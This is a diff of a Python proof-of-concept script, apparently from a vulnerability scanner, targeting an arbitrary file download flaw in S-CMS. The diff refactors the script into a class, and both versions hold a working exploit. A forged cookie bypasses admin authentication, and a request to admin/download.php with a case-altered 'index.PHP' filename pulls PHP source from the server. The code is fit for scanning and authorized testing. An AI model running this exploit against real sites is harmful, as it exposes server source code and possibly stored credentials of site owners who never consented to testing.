@@ -2,40 +2,37 @@
 # -*- coding: utf-8 -*-
 # @author: 'orleven'
 
-
-'''
-https://xz.aliyun.com/t/3614
-'''
 import re
+from script import Script, SERVER_PORT_MAP
 
-def info(data=None):
-    info = {
-        "name": "s-cms download",
-        "info": "s-cms download",
-        "level": "high",
-        "type": "download",
-    }
-    return info
+class POC(Script):
+    def __init__(self, target=None):
+        self.server_type = SERVER_PORT_MAP.WEB
+        self.name = 's-cms download'
+        self.keyword = ['s-cms', 'download']
+        self.info = 's-cms download'
+        self.type = 'download'
+        self.level = 'high'
+        self.refer = 'https://xz.aliyun.com/t/3614'
+        Script.__init__(self, target=target, server_type=self.server_type)
 
-
-def prove(data):
-    data = init(data, 'scms')
-    if data['base_url']:
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.4 (KHTML, like Gecko) Chrome/6.0.481.0 Safari/534.4",
-            "Cookie": "user=%;pass=%;"
-                   }
-        for path in [""]:
-            poc = "index.Php"
-            url = data['base_url'] + path +"admin/download.php?DownName=%s" % poc.replace("h","H")
-            res = curl('get',url,headers = headers)
-            if res != None and '<?php' in res.text:
-                data['flag'] = 1
-                data['data'].append({"url": url})
-                data['res'].append({"info": url, "key": "s-cms download", 'connect': res.text})
-                return data
-    return data
-
-if __name__=='__main__':
-    from script import init, curl
-    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))
+    def prove(self):
+        self.get_url()
+        if self.base_url:
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.4 (KHTML, like Gecko) Chrome/6.0.481.0 Safari/534.4",
+                "Cookie": "user=%;pass=%;"
+                       }
+            path_list = list(set([
+                self.url_normpath(self.base_url, '/'),
+                self.url_normpath(self.url, './'),
+            ]))
+            for path in path_list:
+                poc = "index.php"
+                url = path +"/admin/download.php?DownName=%s" % poc.replace("h","H")
+                res = self.curl('get',url,headers = headers)
+                if res != None and '<?php' in res.text:
+                    self.flag = 1
+                    self.req.append({"url": url})
+                    self.res.append({"info": url, "key": "s-cms download", 'connect': res.text})
+                    return
